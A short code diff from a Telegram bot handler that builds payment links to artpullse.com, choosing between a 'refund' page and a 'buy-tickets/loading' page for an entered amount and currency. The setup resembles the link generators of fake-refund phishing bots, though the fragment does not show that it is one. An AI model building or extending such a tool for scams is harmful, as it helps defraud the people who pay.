@@ -2037,7 +2037,12 @@ async def manual_payment_amount_handler(message: types.Message):
         if m:
             amount = m.group(1).replace(',', '.')
             currency = m.group(2).upper()
-            link = f"https://artpullse.com/refund/?total={amount}{currency}"
+            # Визначаємо, чи попередній крок був 'refund' чи 'defolt'
+            prev_step = user_step.get(uid)
+            if prev_step == 'manual_payment_defolt':
+                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}{currency}"
+            else:
+                link = f"https://artpullse.com/refund/?total={amount}{currency}"
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
             manual_payment_attempts.pop(uid, None)
